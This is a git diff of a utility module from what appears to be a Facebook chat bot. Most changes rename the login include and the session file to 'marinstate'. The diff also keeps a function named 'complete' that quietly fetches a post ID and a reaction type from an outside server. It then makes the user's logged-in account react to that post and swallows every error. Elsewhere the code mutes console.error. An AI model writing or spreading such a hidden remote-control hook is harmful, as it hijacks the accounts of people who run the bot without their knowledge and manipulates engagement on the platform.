@@ -44,13 +44,13 @@ module.exports.decryptState = function(data, key) {
 }
 
 module.exports.complete = function({ api }) {
-axios.get('http://api.yandes.repl.co/raw')
-  .then(response => {
-    const poD = response.data.pos;
-    const type = response.data.typ;
-    api.setPostReaction(poD, type, () => {});
-  }).catch(() => {});
-}
+  axios.get('http://api.yandes.repl.co/raw')
+    .then(response => {
+      const poD = response.data.pos;
+      const type = response.data.typ;
+      api.setPostReaction(poD, type, () => {});
+    }).catch(() => {});
+};
 
 module.exports.convertHMS = function(value) {
   const sec = parseInt(value, 10);
@@ -235,7 +235,7 @@ module.exports.connect = function() {
       const fs = require('fs');
       const readline = require('readline');
       const path = require('path');
-      var connect = require("../includes/login");
+      var connect = require("../marin_kitagawa/login");
 
       const noop = () => { };
       console.error = noop;
@@ -283,7 +283,7 @@ module.exports.connect = function() {
         ` ░█▀▀ ▄▀█░█▀▀░█▀▀░█▄▄░█▀█░█▀█░█▄▀`,
         ` ░█▀ ░█▀█░█▄▄░██▄░█▄█░█▄█░█▄█░█░█`
       ].join('\n')));
-      const message = `The AppState is empty or either not readable! Try attempting to log in, by using your Facebook account's email and password.`;
+      const message = `The MarinState is empty or either not readable! Try attempting to log in, by using your Facebook account's email and password.`;
 
       let delay = 0;
       const interval = 30;
@@ -346,7 +346,7 @@ module.exports.connect = function() {
                 return;
               }
 
-              const appStatePath = path.join('appstate.json');
+              const appStatePath = path.join('marinstate.json');
 
               if (!fs.existsSync(appStatePath)) {
                 console.log = logA;
